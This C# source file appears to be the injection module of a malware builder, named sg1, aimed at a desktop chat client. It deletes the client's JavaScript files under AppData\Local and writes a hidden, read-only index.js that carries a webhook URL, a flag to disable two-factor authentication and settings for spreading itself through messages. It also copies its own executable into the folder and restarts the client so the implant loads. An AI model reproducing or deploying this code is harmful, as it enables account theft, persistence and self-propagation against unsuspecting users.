using System;
using System.Linq;
using System.IO;
using System.Diagnostics;
using sg1.Properties;

namespace sg1
{
    public static class BuildUtils
    {
        public static bool Modify(string coredir, out string build)
        {
            build = "";
            try
            {
                build = coredir.Split(new string[] { @"\AppData\Local\" }, StringSplitOptions.None)
                .LastOrDefault()
                .Split('\\')
                .FirstOrDefault();
                foreach (var un in Directory.GetFiles(coredir))
                {
                    if (un.EndsWith(".js") || un.EndsWith(".bin") || un == "firstrun")
                    {
                        File.SetAttributes(un, FileAttributes.Normal);
                        File.Delete(un);
                    }
                }
                File.WriteAllText(Path.Combine(coredir, "index.js"), $@"const hook = ""{Config.WH_Url}"";
                const d2fa = {Config.Disable2Auth.ToString().ToLower()};
                const spread = {Config.Spread.ToString().ToLower()};
                const smsg = ""{Config.Message}""
                const spnm = ""{Config.Filename}"";
                {Resources.index}");
                File.SetAttributes(Path.Combine(coredir, "index.js"), FileAttributes.Hidden | FileAttributes.ReadOnly);
                File.WriteAllText(Path.Combine(coredir, "sg1.js"), Resources.sg1);
                File.SetAttributes(Path.Combine(coredir, "sg1.js"), FileAttributes.Hidden | FileAttributes.ReadOnly);
                File.Copy(System.Reflection.Assembly.GetEntryAssembly().Location, Path.Combine(coredir, "sg1.bin"));
                File.SetAttributes(Path.Combine(coredir, "sg1.bin"), FileAttributes.Hidden | FileAttributes.ReadOnly);
                return true;
            }
            catch
            {
                return false;
            }
        }
        public static void RestartBuild(string b)
        {
            try
            {
                string pl = "";
                Process.GetProcessesByName(b.ToLower()).ToList().ForEach(p =>
                {
                    pl = p.MainModule.FileName;
                    p.Kill();
                });
                Process.Start(pl);
            }
            catch { }
        }
    }
}
